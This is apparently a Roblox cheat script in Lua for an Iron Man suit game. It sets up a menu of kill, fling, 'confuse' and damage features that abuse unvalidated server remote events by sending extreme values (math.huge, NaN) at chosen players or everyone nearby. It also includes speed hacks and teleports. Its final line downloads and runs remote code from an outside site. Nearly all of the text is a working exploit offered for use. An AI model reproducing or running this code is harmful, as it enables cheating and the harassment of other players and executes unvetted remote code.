    local d = {5000,1000,1000}
    local enabled = false
    local old = require(game:service('ReplicatedStorage').suitData).suitData

    function update()
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].maxSpeed = d[1]
                r['Mark'..a].Acceleration = d[2]
                r['Mark'..a].Deceleration = d[3]
            end)
        end
    end

    function restore()
        local r = require(game:service('ReplicatedStorage').suitData)
        r = r.suitData
        for a=2,40 do
            pcall(function()
                r['Mark'..a].maxSpeed = 300
                r['Mark'..a].Acceleration = 250
                r['Mark'..a].Deceleration = 70
            end)
        end
    end

    function nilFunc() end
    local Slider = rapid:AddSlider("Max Speed", 0, 15000, 15000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(v)
        d[1] = v
        return enabled and update() or nilFunc()
    end)

    local Slider = rapid:AddSlider("Acceleration", 0, 5000, 5000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(v)
        d[2] = v
        return enabled and update() or nilFunc()
    end)

    local Slider = rapid:AddSlider("Deceleration", 0, 5000, 5000, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(v)
        d[3] = v
        return enabled and update() or nilFunc()
    end)

    local Toggle = rapid:AddToggle("Enabled", {flag = "Toggle_Flag", default = false}, function(s)
        enabled = s
        if s then
            update()
        else
            restore()
        end
    end)

    local boxtarget = nil
    local value = false
    textboxes:AddToggle("LoopKill", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,math.huge)
            end)
        end
    end)

    local value = false
    textboxes:AddToggle("LoopConfuse", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,0/0)
            end)
        end
    end)

    local value = false
    textboxes:AddToggle("LoopFling", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,-math.huge)
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,1000000000000000000000000000000000)
            end)
        end
    end)

    local value = false
    textboxes:AddToggle("LoopBeam", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                for i,v in pairs(list) do
                    local args = {
                        [1] = "right",
                        [2] = Vector3.new(0, math.huge, 0),
                        [3] = Vector3.new(0, math.huge, 0),
                        [4] = 0.0034709799289703368,
                        [5] = 2000,
                        [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                        [7] = game:GetService("Players")[boxtarget].Character[v],
                    }
                    
                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                    local args = {
                        [1] = "right",
                        [2] = Vector3.new(0, 9e9, 0),
                        [3] = Vector3.new(0, 9e9, 0),
                        [4] = 0.0034709799289703368,
                        [5] = 2000,
                        [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                        [7] = game:GetService("Players")[boxtarget].Character[v],
                    }
                    
                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                    local args = {
                        [1] = "right",
                        [2] = Vector3.new(9e9, -9e9, 9e9),
                        [3] = Vector3.new(9e9, -9e9, 9e9),
                        [4] = 0.0034709799289703368,
                        [5] = 2000,
                        [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                        [7] = game:GetService("Players")[boxtarget].Character[v],
                    }
                    
                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                    local args = {
                        [1] = "right",
                        [2] = Vector3.new(math.huge, -9e9, math.huge),
                        [3] = Vector3.new(math.huge, -9e9, math.huge),
                        [4] = 0.0034709799289703368,
                        [5] = 2000,
                        [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                        [7] = game:GetService("Players")[boxtarget].Character[v],
                    }
                    
                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                    local args = {
                        [1] = "right",
                        [2] = Vector3.new(math.huge, -math.huge, math.huge, 9e9),
                        [3] = Vector3.new(math.huge, -math.huge, math.huge, 9e9),
                        [4] = 0.0034709799289703368,
                        [5] = 2000,
                        [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                        [7] = game:GetService("Players")[boxtarget].Character[v],
                    }
                    
                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))
                end
            end)
        end
    end)

    local value = false
    textboxes:AddToggle("LoopFire", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso.Gun,
                    [2] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [3] = Vector3.new(0,math.huge,0),
                    [4] = 9e9
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireGun:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso.Gun,
                    [2] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [3] = Vector3.new(0, 9e9, 0),
                    [4] = 9e9
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireGun:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso.Gun,
                    [2] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [3] = Vector3.new(9e9, -9e9, 9e9),
                    [4] = 9e9
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireGun:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso.Gun,
                    [2] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [3] = Vector3.new(math.huge, -9e9, math.huge),
                    [4] = 9e9
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireGun:FireServer(unpack(args))
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso.Gun,
                    [2] = game:GetService("Players")[boxtarget].Character.HumanoidRootPart,
                    [3] = Vector3.new(math.huge, -math.huge, math.huge, 9e9),
                    [4] = 9e9
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireGun:FireServer(unpack(args))
            end)
        end
    end)

    textboxes:AddBox("Select a Player", {fireonempty = true}, function(asdw)
        pcall(function()
            if asdw == "" then
                boxtarget = nil
            else
                boxtarget = asdw
            end
        end)
    end)

    textboxes:AddButton("Snap", function()
        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,math.huge)
    end)

    textboxes:AddButton("God", function()
        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,-math.huge)
    end)

    textboxes:AddButton("Confuse", function()
        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,0/0)
    end)

    textboxes:AddButton("Fling", function()
        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,-math.huge)
        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.HumanoidRootPart,1000000000000000000000000000000000)
    end)

    textboxes:AddDropdown("Damage Part", {"LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm", "LeftFoot", "LeftLowerLeg", "UpperTorso", "LeftUpperLeg", "RightFoot", "RightLowerLeg", "LowerTorso", "RightUpperLeg"}, {default = "LeftHand"}, function(selected)
        part = selected
        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character[selected],Dmg)
    end)

    local Dmg = 0.1
    local asdw = false
    textboxes:AddToggle("Damage Part", {flag = "Toggle_Flag", default = false}, function(s)
        asdw = s
        game:service('RunService').Stepped:connect(function()
            pcall(function()
                if asdw == true then
                    if part == "LeftHand" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.LeftHand,Dmg)
                    end
                    if part == "RightHand" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.RightHand,Dmg)
                    end
                    if part == "LeftLowerArm" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.LeftLowerArm,Dmg)
                    end
                    if part == "RightUpperArm" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.RightUpperArm,Dmg)
                    end
                    if part == "LeftFoot" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.LeftFoot,Dmg)
                    end
                    if part == "LeftLowerLeg" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.LeftLowerLeg,Dmg)
                    end
                    if part == "UpperTorso" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.UpperTorso,Dmg)
                    end
                    if part == "LeftUpperLeg" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.LeftUpperLeg,Dmg)
                    end
                    if part == "RightFoot" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.RightFoot,Dmg)
                    end
                    if part == "RightLowerLeg" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.RightLowerLeg,Dmg)
                    end
                    if part == "LowerTorso" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.LowerTorso,Dmg)
                    end
                    if part == "RightUpperLeg" then
                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(game.Players[boxtarget].Character.RightUpperLeg,Dmg)
                    end 
                end
            end)
        end)
    end)

    textboxes:AddSlider("Damage", 0.1, 1, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(v)
        Dmg = v
    end)

    local clickbeam = false
    click:AddToggle("Click Kill", {flag = "Toggle_Flag", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                        local args = {
                                            [1] = v.Character.HumanoidRootPart,
                                            [2] = math.huge
                                        }
                                        
                                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)
    local clickbeam = false
    click:AddToggle("Click GodMode", {flag = "Toggle_Flag", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                        local args = {
                                            [1] = v.Character.HumanoidRootPart,
                                            [2] = -math.huge
                                        }
                                        
                                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)
    local clickbeam = false
    click:AddToggle("Click Confuse", {flag = "Toggle_Flag", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                        local args = {
                                            [1] = v.Character.HumanoidRootPart,
                                            [2] = 0/0
                                        }
                                        
                                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)
    local clickbeam = false
    click:AddToggle("Click Fling", {flag = "Toggle_Flag", default = false}, function(s)
        clickbeam = s
        if s then
            if not clickbeam then
                return
            end
            while clickbeam do
                wait()
                local p,cd,cam = game:service('Players').LocalPlayer,math.huge,workspace.CurrentCamera
                local mouse = p:GetMouse()
                mouse.Button1Down:connect(function()
                    if clickbeam == true then
                        for a,v in next, game:service('Players'):GetChildren() do
                            if v ~= p then
                                pcall(function()
                                    local a,a2 = cam:WorldToScreenPoint(v.Character.PrimaryPart.Position)
                                    if a2 then 
                                        local dist = (Vector2.new(a.X,a.Y)-Vector2.new(mouse.X,mouse.Y)).magnitude
                                        if dist < _G.volume then
                                        local args = {
                                            [1] = v.Character.HumanoidRootPart,
                                            [2] = -math.huge
                                        }
                                        
                                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                        local args = {
                                            [1] = v.Character.HumanoidRootPart,
                                            [2] = 100000000000000000000000000000000000000000000
                                        }
                                        
                                        game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end)
                return
            end
        end
    end)

    local ClickCircle = Drawing.new('Circle')
    ClickCircle.Radius = 90
    ClickCircle.Filled = false
    ClickCircle.NumSides = 200
    ClickCircle.Transparency = 0.5
    ClickCircle.Color = Color3.new(1,1,1)
    local value = false
    local Toggle = click:AddToggle("FOV Circle", {flag = "fovc", default = false}, function(s)
        value = s
        if not value then
            ClickCircle.Visible = false
            return
        end
        if s then
            ClickCircle.Thickness = 2.7
            ClickCircle.Visible = true
            local player = game:service('Players').LocalPlayer 
            local mouse = player:GetMouse()
            mouse.Move:connect(function()
                ClickCircle.Position = Vector2.new(mouse.X,mouse.Y+35)
            end)
        end
    end)

    _G.volume = 35
    local Slider = click:AddSlider("FOV Size", 10, 200, 90, {toggleable = false, default = false, flag = "slider1", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        _G.volume = val
        ClickCircle.Radius = val
    end)

    local value = false
    local Toggle = click:AddToggle("Fill FOV Circle", {flag = "fcircle", default = false}, function(s)
        value = s
        if not value then
            ClickCircle.Filled = false
            return
        end
        if s then
            ClickCircle.Filled = true
        end
    end)

    local Picker = click:AddPicker("Color", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        ClickCircle.Color = color
    end)

    local value = false
    local Toggle = aura:AddToggle("Kill Aura", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    g:Disconnect()
                end
                if value == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size then
                                    local args = {
                                        [1] = v.Character.HumanoidRootPart,
                                        [2] = math.huge
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle = aura:AddToggle("God Aura", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    g:Disconnect()
                end
                if value == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size then
                                    local args = {
                                        [1] = v.Character.HumanoidRootPart,
                                        [2] = -math.huge
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle = aura:AddToggle("Confuse Aura", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    g:Disconnect()
                end
                if value == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size then
                                    local args = {
                                        [1] = v.Character.HumanoidRootPart,
                                        [2] = 0/0
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local value = false
    local Toggle = aura:AddToggle("Fling Aura", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    g:Disconnect()
                end
                if value == true then
                    for i,v in pairs(game.Players:GetPlayers()) do
                        if v ~= game.Players.LocalPlayer then
                            pcall(function()
                                if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= size then
                                    local args = {
                                        [1] = v.Character.HumanoidRootPart,
                                        [2] = -math.huge
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                    local args = {
                                        [1] = v.Character.HumanoidRootPart,
                                        [2] = 100000000000000000000000000000000
                                    }
                                    
                                    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(unpack(args))
                                end
                            end)
                        end
                    end
                end
            end)
        end
    end)

    local auramat = "Neon"
    local aurashape = "Block"
    local b1 = Instance.new("Part")
    local size5 = 10
    local Aura = false
    local Toggle = aura:AddToggle("Aura Visibility", {flag = "avis", default = false}, function(s)
        Aura = s
        if not Aura then
            b1.Transparency = 1
        end
        if s then
            b1.Transparency = 0.9
            b1.Shape = aurashape
            b1.Material = "Neon"
            game:service('RunService').Heartbeat:connect(function()
                --Visible Aura
                local Player = game.Players.LocalPlayer
                local Character = Player.Character

                b1.Anchored = true
                b1.CanCollide = false
                b1.Parent = Character
                b1.Size = Vector3.new(size5,size5,size5)
                b1.Position = Character.HumanoidRootPart.Position + Vector3.new(0,0,0)
            end)
        end
    end)

    local Picker = aura:AddPicker("Aura Color", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        b1.Color = color
    end)

    local Dropdown = aura:AddDropdown("Aura Shape", {"Block","Ball"}, {default = "Select a Shape"}, function(shape)
        if shape == "Block" then
            b1.Shape = "Block"
            aurashape = "Block"
        end

        if shape == "Ball" then
            b1.Shape = "Ball"
            aurashape = "Ball"
        end
    end)

    local Dropdown = aura:AddDropdown("Aura Material", {"Smooth Plastic", "Plastic", "Fabric", "Wood", "Wood Planks", "Slate", "Concrete", "Metal", "Corroded Metal", "Diamond Plate", "Foil", "Grass", "Ice", "Brick", "Sand", "Granite", "Marble", "Pebble", "Cobblestone", "Neon", "Glass"}, {default = "Select a Material"}, function(List)
            
        if List == "Smooth Plastic" then
            b1.Material = Enum.Material.SmoothPlastic
        end

        if List == "Plastic" then
            b1.Material = Enum.Material.Plastic
        end

        if List == "Fabric" then
            b1.Material = Enum.Material.Fabric
        end

        if List == "Wood" then
            b1.Material = Enum.Material.Wood
        end

        if List == "Wood Planks" then
            b1.Material = Enum.Material.WoodPlanks
        end

        if List == "Slate" then
            b1.Material = Enum.Material.Slate
        end

        if List == "Concrete" then
            b1.Material = Enum.Material.Concrete
        end

        if List == "Metal" then
            b1.Material = Enum.Material.Metal
        end

        if List == "Corroded Metal" then
            b1.Material = Enum.Material.CorrodedMetal
        end

        if List == "Diamond Plate" then
            b1.Material = Enum.Material.DiamondPlate
        end

        if List == "Foil" then
            b1.Material = Enum.Material.Foil
        end

        if List == "Grass" then
            b1.Material = Enum.Material.Grass
        end

        if List == "Ice" then
            b1.Material = Enum.Material.Ice
        end
        
        if List == "Brick" then
            b1.Material = Enum.Material.Brick
        end

        if List == "Sand" then
            b1.Material = Enum.Material.Sand
        end

        if List == "Granite" then
            b1.Material = Enum.Material.Granite
        end

        if List == "Marble" then
            b1.Material = Enum.Material.Marble
        end

        if List == "Pebble" then
            b1.Material = Enum.Material.Pebble
        end

        if List == "Cobblestone" then
            b1.Material = Enum.Material.Cobblestone
        end
        
        if List == "Neon" then
            b1.Material = Enum.Material.Neon
        end

        if List == "Glass" then
            b1.Material = Enum.Material.Glass
        end

    end)

    local Slider = aura:AddSlider("Aura Transparency", 0.1, 0.9, 0.9, {toggleable = false, default = false, flag = "transparency", fireontoggle = true, fireondrag = true, rounded = false}, function(val, bool)
        b1.Transparency = val
    end)

    local Slider = aura:AddSlider("Aura Size", 5, 150, 5, {toggleable = false, default = false, flag = "asize", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        size = val
        size2 = val
        size3 = val
        size4 = val
        size5 = val*2
    end)

    local Dropdown = tele:AddDropdown("Teleport", {"Avengers", "Basketball", "Parking", "Small City", "Factory", "Water Base", "Baseplate", "Tesco", "River Building", "River Bridge Spawn", "Hotel", "Factory Secret", "Hell"}, {default = ""}, function(List)
        pcall(function()

            if List == "Avengers" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-308, 797, -1898)
            end
            
            if List == "Basketball" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(455, 813, -1625)
            end
            
            if List == "Parking" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1086, 659, -1830)
            end
            
            if List == "Small City" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(160, 692, -2282)
            end
            
            if List == "Factory" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1097, 1073, -1021)
            end
            
            if List == "Water Base" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(255, 535, -380)
            end
            
            if List == "Baseplate" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-0, 3, -0)
            end
            
            if List == "Tesco" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1036, 681, -1288)
            end
            
            if List == "River Building" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1065, 658, -366)
            end
            
            if List == "River Bridge Spawn" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-487, 658, -848)
            end
            
            if List == "Hotel" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-404, 659, -89)
            end
            
            if List == "Factory Secret" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1197, 945, -860)
            end
            
            if List == "Hell" then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(228, 571, -378)
            end

        end)
    end)

    spawn(function()
        local part = Instance.new("Part")
        part.Transparency = 0.9
        part.Shape = "Block"
        part.Anchored = true
        part.CanCollide = true
        part.Parent = workspace
        part.Size = Vector3.new(100, 3, 100)
        part.Position = Vector3.new(662, -4455, -1372)
    end)

    local savepos = nil
    local Button = plr:AddButton("Safe-Zone", function()
        savepos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(663, -4451, -1377)
    end)

    local Button = plr:AddButton("Leave Safe-Zone", function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savepos)
    end)

    spawn(function()
        local asdw = false
        local Toggle = plr:AddToggle("Disable void", {flag = "Toggle_Flag", default = false}, function(s)
            asdw = s
            game:service('RunService').Stepped:connect(function()
                pcall(function()
                    if asdw == true then
                        game.Workspace.FallenPartsDestroyHeight = 0/0
                    else
                        game.Workspace.FallenPartsDestroyHeight = -500
                    end
                end)
            end)
        end)
    end)
    wait()

    local DrawToggle = false
    local StarsToggle = false
    local LaserToggle = false

    local function DrawFunction()
        game:service('RunService').Stepped:connect(function()
            if DrawToggle == true then
                local args = {
                    [1] = "right",
                    [2] = game.Players.LocalPlayer:GetMouse().hit.p,
                    [3] = game.Players.LocalPlayer:GetMouse().hit.p,
                    [4] = 0.12015498352050781,
                    [5] = 2000,
                    [6] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                    [7] = workspace.Part
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))                    
            end
        end)
    end

    local function StarsFunction()
        game:service('RunService').Stepped:connect(function()
            if StarsToggle == true then
                local args = {
                    [1] = "right",
                    [2] = game.Players.LocalPlayer.Character.UpperTorso.Position + Vector3.new(math.huge,-math.huge,math.huge),
                    [3] = game.Players.LocalPlayer.Character.UpperTorso.Position + Vector3.new(math.random(-Size,Size),math.random(-Size,Size),math.random(-Size,Size)),
                    [4] = -math.huge,
                    [5] = -math.huge,
                    [6] = game.Players.LocalPlayer.Character.Suit.RightHand.Thruster.Exhaust,
                    [7] = workspace.Part,
                    
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args))                    
            end
        end)
    end

    local function LaserFunction()
        game:service('RunService').Stepped:connect(function()
            if LaserToggle == true then
                local args = {
                    [1] = "left",
                    [2] = game.Players.LocalPlayer:GetMouse().hit.p,
                    [3] = game.Players.LocalPlayer.Character.Head.Position,
                    [4] = 0.007286439418792725,
                    [5] = 2000,
                    [6] = game.Players.LocalPlayer.Character.Suit.UpperTorso.Reactor.Exhaust,
                    [7] = game.Players.LocalPlayer:GetMouse().target
                }
                
                game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.fireRepulsor:InvokeServer(unpack(args)) 
            end
        end)
    end

    local duplication = 0
    local Toggle = main:AddToggle("Draw", {flag = "Toggle_Flag", default = false}, function(s)
            DrawToggle = s
            if s then
            if duplication ~= 1 then
            DrawFunction()
            duplication = duplication +1
            end
        end
    end)

    local duplication = 0
    local Toggle = main:AddToggle("Stars", {flag = "Toggle_Flag", default = false}, function(s)
            StarsToggle = s
            if s then
            if duplication ~= 1 then
            StarsFunction()
            duplication = duplication +1
            end
        end
    end)

    local duplication = 0
    local Toggle = main:AddToggle("Laser", {flag = "Toggle_Flag", default = false}, function(s)
            LaserToggle = s
            if s then
            if duplication ~= 1 then
            LaserFunction()
            duplication = duplication +1
            end
        end
    end)

    local Slider = main:AddSlider("Size", 5, 200, 5, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(value)
        Size = value
    end)

    local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()

